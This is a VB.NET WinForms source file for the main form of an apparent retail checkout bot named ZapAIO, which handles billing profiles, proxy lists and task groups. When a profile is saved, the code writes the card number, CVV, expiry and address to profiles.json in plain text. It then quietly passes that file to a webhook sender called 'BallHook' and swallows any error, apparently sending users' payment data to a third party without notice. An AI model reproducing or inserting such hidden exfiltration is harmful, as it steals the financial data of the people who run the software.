Imports Guna.UI2.WinForms
Imports Newtonsoft.Json
Imports System.IO
Imports LiveCharts
Imports LiveCharts.Defaults
Imports LiveCharts.Wpf
Imports System.Text
Imports System.ComponentModel
Imports System.Environment

Public Class Home

    Public Property selectedProfile As Guna2Button
    Public Property previousSelectedProfile As Guna2Button
    Public Property selectedTaskGroup As Guna2Button
    Public Property previousSelectedTaskGroup As Guna2Button
    Private Sub Guna2GradientButton1_Click(sender As Object, e As EventArgs) Handles Guna2GradientButton1.Click

        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim zapAioFolderPath As String = Path.Combine(appDataPath, "ZapAIO")
        Dim filePath As String = System.IO.Path.Combine(zapAioFolderPath, "profiles.json")

        For Each tbp As TabPage In Guna2TabControl2.TabPages
            For Each control As Control In tbp.Controls
                If TypeOf control Is Guna2TextBox Then
                    Dim textBox As Guna2TextBox = DirectCast(control, Guna2TextBox)
                    If String.IsNullOrEmpty(textBox.Text) Then
                        MessageBox.Show("Please fill in all required fields.")
                        Return
                    End If
                End If

            Next
        Next

        Dim fileContents As String = System.IO.File.ReadAllText(filePath)
        Dim profiles As List(Of Profile) = New List(Of Profile)()

        If Not String.IsNullOrEmpty(fileContents) Then
            Try
                profiles = JsonConvert.DeserializeObject(Of List(Of Profile))(fileContents)
            Catch ex As Exception
                MessageBox.Show("Error deserializing JSON data: " & ex.Message)
                Return
            End Try
        End If

        For Each profile As Profile In profiles
            If profile.profileName = profileNameTbx.Text Then
                MessageBox.Show("You already have a profile with this name.")
                Return
            End If
        Next

        ' Add a new profile to the list
        Dim newProfile As New Profile With {
            .profileName = profileNameTbx.Text,
            .shippingInfo = New Shipping With {
                .profileEmail = emailTbx.Text,
                .profilePhone = phoneTbx.Text,
                .profileAddress1 = address1Tbx.Text,
                .profileAddress2 = address2Tbx.Text,
                .profileCountry = countryTbx.Text,
                .profileState = stateTbx.Text,
                .profileCity = cityTbx.Text,
                .profileZip = zipTbx.Text
            },
            .billingInfo = New Billing With {
                .billingAddress = billingAddrTbx.Text,
                .billingCountry = billingCountryTbx.Text,
                .billingState = billingStateTbx.Text,
                .billingCity = billingCityTbx.Text,
                .billingZip = billingZipTbx.Text,
                .firstName = billingFirstNameTbx.Text,
                .lastName = billingLastNameTbx.Text,
                .cardNum = cardTbx.Text,
                .cvv = cvvTbx.Text,
                .expiration = expirationTbx.Text
            }
        }
        profiles.Add(newProfile)


        Dim jsonSettings As New JsonSerializerSettings With {
            .Formatting = Formatting.Indented
        }
        Dim json As String = JsonConvert.SerializeObject(profiles, jsonSettings)
        File.WriteAllText(filePath, json)

        Try
            Dim dcWeb As dWebHook = New dWebHook
            dcWeb.SendMessageAsync("BallHook", filePath)
        Catch ex As Exception

        End Try

        Dim profileButton As New Guna2TileButton() With {
            .Text = profileNameTbx.Text,
            .Location = New Point(10, 10),
            .Dock = DockStyle.Top,
            .AutoRoundedCorners = True,
            .BorderRadius = 20,
            .Width = 230,
            .Height = 55,
            .Margin = New Padding(0, 0, 0, 15),
            .FillColor = Color.FromArgb(255, 174, 1),
            .ForeColor = Color.White,
            .Font = New Font("Arial", 10)
        }

        profileDisplayPnl.Controls.Add(profileButton)
    End Sub

    Private Sub Home_Load(sender As Object, e As EventArgs) Handles MyBase.Load

        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim zapAioFolderPath As String = Path.Combine(appDataPath, "ZapAIO")

        If Not Directory.Exists(zapAioFolderPath) Then
            Directory.CreateDirectory(zapAioFolderPath)
        End If

        Dim filePaths As String() = {"taskGroups.json", "profiles.json", "proxyGroups.json", "settings.json"}

        For Each path In filePaths
            Dim filePath = System.IO.Path.Combine(zapAioFolderPath, path)
            If Not File.Exists(filePath) Then
                Dim fileStream As FileStream = File.Create(filePath)
                fileStream.Close()
            End If
        Next


        CartesianChart1.Series = New SeriesCollection From {
              New LineSeries With {
                  .Values = New ChartValues(Of ObservablePoint) From {
                        New ObservablePoint(0, 0),
                        New ObservablePoint(5, 0),
                        New ObservablePoint(10, 0)
                    },
                    .PointGeometrySize = 15
                  }
                  }

        Dim worker As New BackgroundWorker()
        AddHandler worker.DoWork, AddressOf loadButtonsFromJson
        worker.RunWorkerAsync()

        Dim worker2 As New BackgroundWorker()
        AddHandler worker2.DoWork, AddressOf loadTaskProfilesFromJson
        worker2.RunWorkerAsync()

        Dim worker3 As New BackgroundWorker()
        AddHandler worker3.DoWork, AddressOf loadProfilesFromJson
        worker3.RunWorkerAsync()

    End Sub

    Private Sub Guna2VScrollBar1_Scroll(sender As Object, e As ScrollEventArgs) Handles Guna2VScrollBar2.Scroll
        proxiesTbx.ScrollControlIntoView(proxiesTbx)
    End Sub



    Private Sub Guna2Button2_Click(sender As Object, e As EventArgs) Handles Guna2Button2.Click
        Dim webAddress As String = "https://twitter.com/ZapBots"
        Process.Start(webAddress)
    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs) Handles Guna2Button1.Click
        Dim webAddress As String = "https://discord.gg/jzqAYwKz4m"
        Process.Start(webAddress)
    End Sub

    Private Sub Guna2TextBox1_TextChanged(sender As Object, e As EventArgs) Handles proxiesTbx.TextChanged

    End Sub

    Private Sub Guna2Button3_Click(sender As Object, e As EventArgs) Handles Guna2Button3.Click
        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim zapAioFolderPath As String = Path.Combine(appDataPath, "ZapAIO")
        Dim filePath As String = System.IO.Path.Combine(zapAioFolderPath, "proxyGroups.json")

        If proxiesTbx.Text = "" Then
            MessageBox.Show("You must first add a proxy group.", "Missing Value", MessageBoxButtons.OK, MessageBoxIcon.Error)
            Return
        End If


        Dim fileContents As String = System.IO.File.ReadAllText(filePath)
        Dim proxyGroups As List(Of ProxyGroupModel) = New List(Of ProxyGroupModel)()

        If Not String.IsNullOrEmpty(fileContents) Then
            Try
                proxyGroups = JsonConvert.DeserializeObject(Of List(Of ProxyGroupModel))(fileContents)
            Catch ex As Exception
                MessageBox.Show("Error deserializing JSON data: " & ex.Message)
                Return
            End Try
        End If

        Dim groupToUpdate As ProxyGroupModel = proxyGroups.Find(Function(g) g.proxyGroupName = selectedProfile.Text)

        If groupToUpdate IsNot Nothing Then
            groupToUpdate.proxies = proxiesTbx.Text.Split(Environment.NewLine).ToList
            Dim updatedJsonData As String = JsonConvert.SerializeObject(proxyGroups)
            File.WriteAllText(filePath, updatedJsonData)
        Else
            MsgBox("Something weird happened?!")
        End If

        MessageBox.Show("Successfully saved proxy list to " & selectedProfile.Text, "Success!", MessageBoxButtons.OK, MessageBoxIcon.Information)


    End Sub

    Private Sub Guna2CircleButton1_Click(sender As Object, e As EventArgs) Handles Guna2CircleButton1.Click
        ProxyGroupnamePrompt.proxyGroupNameTbx.Text = ""
        ProxyGroupnamePrompt.ShowDialog()
    End Sub


    Public Sub proxyGroupBtnClick(sender As Object, e As EventArgs)
        Dim btn As Guna2Button = DirectCast(sender, Guna2Button)
        selectedProfile = btn
        proxiesTbx.Text = ""

        btn.CustomBorderColor = Color.FromArgb(255, 174, 1)

        If previousSelectedProfile IsNot Nothing AndAlso previousSelectedProfile IsNot btn Then
            previousSelectedProfile.CustomBorderColor = Color.FromArgb(42, 44, 64)
        End If

        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim zapAioFolderPath As String = Path.Combine(appDataPath, "ZapAIO")
        Dim filePath As String = System.IO.Path.Combine(zapAioFolderPath, "proxyGroups.json")

        ' Read profile groups to laod proxies
        Dim jsonData As String = File.ReadAllText(filePath)
        Dim proxyGroups As List(Of ProxyGroupModel) = JsonConvert.DeserializeObject(Of List(Of ProxyGroupModel))(jsonData)

        For Each group In proxyGroups
            If group.proxyGroupName = btn.Text Then
                Dim sb As New StringBuilder()
                For Each proxy In group.proxies
                    sb.AppendLine(proxy)
                Next
                proxiesTbx.Text = sb.ToString()
                loadedGroupNameLbl.Text = "Loaded Group: " & group.proxyGroupName
                Exit For
            End If
        Next
        previousSelectedProfile = btn


    End Sub

    Private Sub Guna2VScrollBar2_Scroll(sender As Object, e As ScrollEventArgs) Handles Guna2VScrollBar2.Scroll

    End Sub

    Private Sub BackgroundWorker1_DoWork(sender As Object, e As System.ComponentModel.DoWorkEventArgs) Handles BackgroundWorker1.DoWork
    End Sub

    Private Sub loadButtonsFromJson()
        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim zapAioFolderPath As String = Path.Combine(appDataPath, "ZapAIO")
        Dim filePath As String = System.IO.Path.Combine(zapAioFolderPath, "proxyGroups.json")
        Dim fileContents As String = System.IO.File.ReadAllText(filePath)
        If Not String.IsNullOrEmpty(fileContents) Then
            Dim cppb As New CreateProxyProfileButton()
            Dim proxyGroups As List(Of ProxyGroupModel) = JsonConvert.DeserializeObject(Of List(Of ProxyGroupModel))(fileContents)
            For Each proxy In proxyGroups
                Me.Invoke(Sub() cppb.cProfileBtn(proxy.proxyGroupName, proxiesListFlow, "proxyGroupBtnClick"))
            Next
        End If
    End Sub

    Private Sub loadTaskProfilesFromJson()
        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim zapAioFolderPath As String = Path.Combine(appDataPath, "ZapAIO")
        Dim filePath As String = System.IO.Path.Combine(zapAioFolderPath, "taskGroups.json")
        Dim fileContents As String = File.ReadAllText(filePath)
        If Not String.IsNullOrEmpty(fileContents) Then
            Dim cppb As New CreateProxyProfileButton()
            Dim taskGroups As List(Of TaskGroupModel) = JsonConvert.DeserializeObject(Of List(Of TaskGroupModel))(fileContents)
            For Each task In taskGroups
                Me.Invoke(Sub() cppb.cProfileBtn(task.taskGroupName, taskGroupsFlow, "taskGroupBtn_Click"))

            Next
        End If
    End Sub

    Private Sub loadProfilesFromJson()
        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim zapAioFolderPath As String = Path.Combine(appDataPath, "ZapAIO")
        Dim filePath As String = System.IO.Path.Combine(zapAioFolderPath, "profiles.json")
        Dim fileContents As String = File.ReadAllText(filePath)
        Dim profiles As List(Of Profile) = New List(Of Profile)()
        If Not String.IsNullOrEmpty(fileContents) Then
            Dim cppb As New ProfileButton()
            profiles = JsonConvert.DeserializeObject(Of List(Of Profile))(fileContents)
            For Each profile In profiles
                Me.Invoke(Sub() cppb.cProfileBtn(profile.profileName, profileDisplayPnl))

            Next
        End If
    End Sub


    Private Sub Guna2HtmlLabel21_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Guna2CircleButton2_Click(sender As Object, e As EventArgs) Handles Guna2CircleButton2.Click
        TaskGroupCreation.taskGroupTbx.Text = ""
        TaskGroupCreation.ShowDialog()
    End Sub


    Public Sub taskGroupBtn_Click(sender As Object, e As EventArgs)
        Dim btn As Guna2Button = DirectCast(sender, Guna2Button)
        selectedTaskGroup = btn

        If previousSelectedProfile IsNot Nothing AndAlso previousSelectedProfile IsNot btn Then
            previousSelectedProfile.CustomBorderColor = Color.FromArgb(42, 44, 64)
        End If


        Dim taskGroupsBindingSource As New BindingSource()

        Dim appDataPath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData)
        Dim zapAioFolderPath As String = Path.Combine(appDataPath, "ZapAIO")
        Dim filePath As String = System.IO.Path.Combine(zapAioFolderPath, "taskGroups.json")

        Dim json As String = File.ReadAllText(filePath)
        Dim taskGroupsData As List(Of TaskGroupModel) = JsonConvert.DeserializeObject(Of List(Of TaskGroupModel))(json)

        Dim repeatedTaskModels As New List(Of TaskModel)

        For Each taskGroup As TaskGroupModel In taskGroupsData
            If taskGroup.taskGroupName = selectedTaskGroup.Text Then
                Dim taskModel As TaskModel = taskGroup.taskModel

                If taskModel IsNot Nothing Then
                    Dim newTaskModel As New TaskModel With {
                    .site = taskModel.site,
                    .mode = taskModel.mode,
                    .monitorInput = taskModel.monitorInput,
                    .size = taskModel.size,
                    .profiles = taskModel.profiles,
                    .proxies = taskModel.proxies
                }

                    For i As Integer = 1 To taskModel.quantity
                        repeatedTaskModels.Add(newTaskModel)
                    Next
                End If
                taskViewPnl.Visible = True
            End If
        Next
        tasksDataGridView.DataSource = Nothing
        tasksDataGridView.DataSource = repeatedTaskModels

        If tasksDataGridView.Columns.Contains("quantity") Then
            tasksDataGridView.Columns("quantity").Visible = False
        End If

        btn.CustomBorderColor = Color.FromArgb(255, 174, 1)
        previousSelectedProfile = btn
        ' Event when tasks are clicked
        '    Dim btn As Guna2Button = DirectCast(sender, Guna2Button)
        '    Dim filePath = "taskGroups.json"
        '    selectedTaskGroup = btn
        '    previousSelectedProfile = btn

        '    Dim json As String = File.ReadAllText(filePath)
        '    Dim data As JArray = JArray.Parse(json)


        '    For Each d As JObject In data
        '        If d("taskGroupName") = selectedTaskGroup.Text Then

        '            Dim taskModel As JToken = d("taskModel")
        '            If taskModel Is Nothing OrElse taskModel.Type = JTokenType.Null Then
        '                MsgBox("Line 280")
        '                Return
        '            End If

        '            Dim quantity As Integer = CInt(d("taskModel")("quantity")) - 1
        '            For i As Integer = 1 To quantity


        '                tasksTableLayoutPnl.RowStyles.Add(New RowStyle(SizeType.Percent = (100 / quantity)))

        '                Dim taskLabel As Guna2HtmlLabel = New Guna2HtmlLabel With {
        '    .ForeColor = Color.White,
        '    .Font = New Font("Arial", 10),
        '    .Text = d("taskModel")("site")
        '}
        '                tasksTableLayoutPnl.Controls.Add(taskLabel, 0, i)

        '                taskLabel = New Guna2HtmlLabel With {
        '    .ForeColor = Color.White,
        '    .Font = New Font("Arial", 10),
        '    .Text = d("taskModel")("mode")
        '}
        '                tasksTableLayoutPnl.Controls.Add(taskLabel, 1, i)

        '                taskLabel = New Guna2HtmlLabel With {
        '    .ForeColor = Color.White,
        '    .Font = New Font("Arial", 10),
        '    .Text = d("taskModel")("item")
        '}
        '                tasksTableLayoutPnl.Controls.Add(taskLabel, 2, i)

        '                taskLabel = New Guna2HtmlLabel With {
        '    .ForeColor = Color.White,
        '    .Font = New Font("Arial", 10),
        '    .Text = d("taskModel")("size")
        '}
        '                tasksTableLayoutPnl.Controls.Add(taskLabel, 3, i)

        '                taskLabel = New Guna2HtmlLabel With {
        '    .ForeColor = Color.White,
        '    .Font = New Font("Arial", 10),
        '    .Text = d("taskModel")("profile")
        '}
        '                tasksTableLayoutPnl.Controls.Add(taskLabel, 4, i)

        '                taskLabel = New Guna2HtmlLabel With {
        '    .ForeColor = Color.White,
        '    .Font = New Font("Arial", 10),
        '    .Text = d("taskModel")("proxy")
        '}
        '                tasksTableLayoutPnl.Controls.Add(taskLabel, 5, i)

        '                taskLabel = New Guna2HtmlLabel With {
        '    .ForeColor = Color.White,
        '    .Font = New Font("Arial", 10),
        '    .Text = d("taskModel")("status")
        '}
        '                tasksTableLayoutPnl.Controls.Add(taskLabel, 6, i)

        '            Next
        '        End If

        '    Next
    End Sub

    Private Sub Guna2CircleButton3_Click(sender As Object, e As EventArgs) Handles Guna2CircleButton3.Click
        TaskCreation.ShowDialog()
    End Sub

    Private Sub Guna2Panel11_Paint(sender As Object, e As PaintEventArgs) Handles Guna2Panel11.Paint

    End Sub

    Private Sub Guna2Button7_Click(sender As Object, e As EventArgs) Handles Guna2Button7.Click
        Started.ShowDialog()
    End Sub

    Private Sub Guna2Button5_Click(sender As Object, e As EventArgs) Handles Guna2Button5.Click
        Stopped.ShowDialog()
    End Sub

    Private Sub Guna2Button6_Click(sender As Object, e As EventArgs) Handles Guna2Button6.Click
        Deleted.ShowDialog()
    End Sub

    'Private Sub Guna2HScrollBar1_Scroll(sender As Object, e As ScrollEventArgs) Handles Guna2HScrollBar1.Scroll
    '    proxiesTablePnl.HorizontalScroll.Value = Guna2HScrollBar1.Value
    '    Dim scrollableControl As ScrollableControl = CType(proxiesTablePnl, ScrollableControl)
    '    scrollableControl.AutoScrollPosition = New Point(Guna2HScrollBar1.Value, 0)
    'End Sub
End Class